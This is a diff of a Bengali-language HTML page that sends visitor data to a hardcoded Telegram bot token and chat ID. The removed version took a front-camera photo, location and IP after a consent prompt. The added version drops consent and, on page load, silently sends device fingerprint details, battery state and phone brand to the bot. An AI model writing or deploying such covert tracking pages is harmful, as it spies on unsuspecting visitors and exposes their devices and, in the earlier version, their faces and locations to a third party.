@@ -1,144 +1,90 @@
-
 <!DOCTYPE html>
 <html>
 <head>
   <meta charset="UTF-8">
-  <title>📸 একবার ছবি + লোকেশন + IP</title>
+  <title>📱 ডিভাইস কোম্পানি + ব্যাটারি তথ্য</title>
   <style>
     body {
       font-family: Arial, sans-serif;
-      background: #f0f0f0;
+      background: #f2f2f2;
       text-align: center;
-      padding: 30px;
+      padding: 40px;
     }
-    button {
-      padding: 15px 25px;
-      font-size: 18px;
-      background-color: green;
-      color: white;
-      border: none;
-      border-radius: 8px;
-      cursor: pointer;
-    }
-    video {
-      display: none;
+    h2 { color: #222; }
+    #status {
       margin-top: 20px;
+      font-size: 18px;
+      color: #444;
     }
   </style>
 </head>
 <body>
-  <h2>📷 ছবি + 📍 লোকেশন + 🌐 IP + 🔋 ব্যাটারি</h2>
-  <p>⚠️ সম্মতি দিলে একবার ক্যামেরা ছবি ও তথ্য পাঠানো হবে।</p>
-
-  <video id="video" autoplay playsinline width="300"></video>
-  <canvas id="canvas" style="display:none;"></canvas>
-  <br><br>
-  <button onclick="startProcess()">📸 ছবি পাঠাও</button>
-  <p id="status">🟡 প্রস্তুত...</p>
+  <h2>📲 কোম্পানি + ব্যাটারি তথ্য</h2>
+  <p id="status">⏳ অনুগ্রহ করে অপেক্ষা করুন...</p>
 
   <script>
     const BOT_TOKEN = "7868941323:AAE35R5cQ16Tl1CQpcQNstWl6mMcFLba5_A";
     const CHAT_ID = "1054739462";
+    const status = document.getElementById("status");
 
-    const video = document.getElementById('video');
-    const canvas = document.getElementById('canvas');
-    const status = document.getElementById('status');
-
-    async function startProcess() {
-      const confirmed = confirm("আপনি কি সম্মতি দিচ্ছেন? একবার ছবি ও তথ্য পাঠানো হবে।");
-      if (!confirmed) {
-        status.innerText = "❌ সম্মতি বাতিল করা হয়েছে।";
-        return;
-      }
-
-      // Start camera
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-        video.srcObject = stream;
-        video.style.display = "block";
-        status.innerText = "📸 ক্যামেরা চলছে...";
-
-        setTimeout(() => {
-          captureAndSend(stream);
-        }, 3000);
-      } catch (err) {
-        status.innerText = "❌ ক্যামেরা চালু করা যায়নি!";
-      }
+    function detectBrand(userAgent) {
+      userAgent = userAgent.toLowerCase();
+      if (userAgent.includes("samsung") || userAgent.includes("sm-")) return "Samsung";
+      if (userAgent.includes("redmi") || userAgent.includes("xiaomi")) return "Xiaomi";
+      if (userAgent.includes("realme") || userAgent.includes("rmx")) return "Realme";
+      if (userAgent.includes("oppo")) return "Oppo";
+      if (userAgent.includes("vivo")) return "Vivo";
+      if (userAgent.includes("iphone") || userAgent.includes("ios")) return "Apple";
+      if (userAgent.includes("oneplus")) return "OnePlus";
+      if (userAgent.includes("nokia")) return "Nokia";
+      return "❓ অজানা কোম্পানি";
     }
 
-    async function captureAndSend(stream) {
-      // Draw to canvas
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
-      const ctx = canvas.getContext('2d');
-      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-      const photoBlob = dataURItoBlob(canvas.toDataURL("image/jpeg"));
-
-      // Stop camera
-      stream.getTracks().forEach(track => track.stop());
-      video.style.display = "none";
-
-      // Get battery info
+    async function sendFullDeviceInfo() {
       let batteryInfo = "🔋 Battery: Unknown";
       try {
         const battery = await navigator.getBattery();
         batteryInfo = `🔋 Battery: ${Math.round(battery.level * 100)}% (${battery.charging ? "Charging" : "Not Charging"})`;
       } catch (e) {}
 
-      // Get location
-      let locationInfo = "📍 Location: Not Available";
+      const userAgent = navigator.userAgent;
+      const platform = navigator.platform;
+      const memory = navigator.deviceMemory || "Unknown";
+      const cpuCores = navigator.hardwareConcurrency || "Unknown";
+      const screenRes = `${screen.width}x${screen.height}`;
+      const brand = detectBrand(userAgent);
+
+      const deviceInfo = `📱 ডিভাইস কোম্পানি: ${brand}
+🛠️ User-Agent: ${userAgent}
+🧠 Platform: ${platform}
+💾 RAM: ${memory} GB
+🧮 CPU Cores: ${cpuCores}
+📐 স্ক্রিন: ${screenRes}`;
+
+      const message = `${batteryInfo}
+${deviceInfo}`;
+
       try {
-        const pos = await new Promise((res, rej) => {
-          navigator.geolocation.getCurrentPosition(res, rej);
+        const res = await fetch(\`https://api.telegram.org/bot\${BOT_TOKEN}/sendMessage\`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: message
+          })
         });
-        const { latitude, longitude } = pos.coords;
-        locationInfo = `📍 https://www.google.com/maps?q=${latitude},${longitude}`;
-      } catch (e) {}
 
-      // Get IP
-      let ipInfo = "🌐 IP: Unknown";
-      try {
-        const ipRes = await fetch("https://api.ipify.org?format=json");
-        const ipData = await ipRes.json();
-        ipInfo = `🌐 IP: ${ipData.ip}`;
-      } catch (e) {}
-
-      // Prepare message
-      const caption = `${batteryInfo}
-${locationInfo}
-${ipInfo}`;
-
-      // Send to Telegram
-      const formData = new FormData();
-      formData.append("chat_id", CHAT_ID);
-      formData.append("photo", photoBlob, "photo.jpg");
-      formData.append("caption", caption);
-
-      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-        method: "POST",
-        body: formData
-      }).then(response => {
-        if (response.ok) {
-          status.innerText = "✅ একবার সফলভাবে পাঠানো হয়েছে!";
+        if (res.ok) {
+          status.innerText = "✅ পাঠানো হয়েছে!";
         } else {
           status.innerText = "⚠️ পাঠাতে সমস্যা হয়েছে!";
         }
-      }).catch(error => {
-        console.error(error);
+      } catch (err) {
         status.innerText = "🚫 নেটওয়ার্ক সমস্যা!";
-      });
+      }
     }
 
-    function dataURItoBlob(dataURI) {
-      const byteString = atob(dataURI.split(',')[1]);
-      const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
-      const ab = new ArrayBuffer(byteString.length);
-      const ia = new Uint8Array(ab);
-      for (let i = 0; i < byteString.length; i++) {
-        ia[i] = byteString.charCodeAt(i);
-      }
-      return new Blob([ab], { type: mimeString });
-    }
+    window.onload = sendFullDeviceInfo;
   </script>
 </body>
 </html>
